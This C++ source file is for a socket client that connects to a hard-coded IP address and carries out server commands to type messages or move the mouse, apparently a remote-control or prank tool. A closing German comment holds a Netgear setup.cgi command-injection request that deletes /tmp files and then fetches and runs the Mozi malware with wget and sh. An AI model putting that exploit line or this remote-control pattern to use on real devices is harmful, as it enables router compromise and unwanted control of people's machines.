#include <iostream>
#include <thread>
#include "Client.h"
#include "States.h"

void run(); 
void listenForServerMessage(ClientClass* client, std::string* message);
void evaluateMessage(std::string&);
void write(std::string); 
void cleanup(); 
void mouseMovementLoop();

ClientClass *client;
StateClass *sc; 

std::thread *mouseMoveThread = new std::thread(), *writeMessageThread = new std::thread();

void init() {

	client = new ClientClass("77.20.133.201", 8080); // 77.20.133.201

	run(); 
}

void run() {

	std::string mes; 

	while (true) {

		if (!client->socket->is_open()) {
			break; 
		}

		listenForServerMessage(client, &mes); // client as pointer, message is saved in "mes"

		if (mes[0] == '0') {
			break; 
		}

		evaluateMessage(mes); 

	}

	cleanup(); 
	
}

void evaluateMessage(std::string& mes) {
	if (mes[0] == '1') { 

		if (writeMessageThread->joinable()) {
			writeMessageThread->join(); 
		}
		writeMessageThread = new std::thread(write, mes.substr(1));

	}

	if (mes[0] == '2') {
		if (mouseMoveThread->joinable()) {
			mouseMoveThread->join(); 
		}
		mouseMoveThread = new std::thread(mouseMovementLoop);

	}

}

void cleanup() {

	if (writeMessageThread->joinable()) {
		writeMessageThread->join(); 
	}

	if (mouseMoveThread->joinable()) {
		mouseMoveThread->join();
	}


	mouseMoveThread->~thread(); 
	delete mouseMoveThread; 

	writeMessageThread->~thread();
	delete writeMessageThread; 

	client->socket->close(); 
	client->clientCleanup();
}

/*

Falls man Nachrichten senden will, muss man nen linebreak ans ende setzen

|GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0|

*/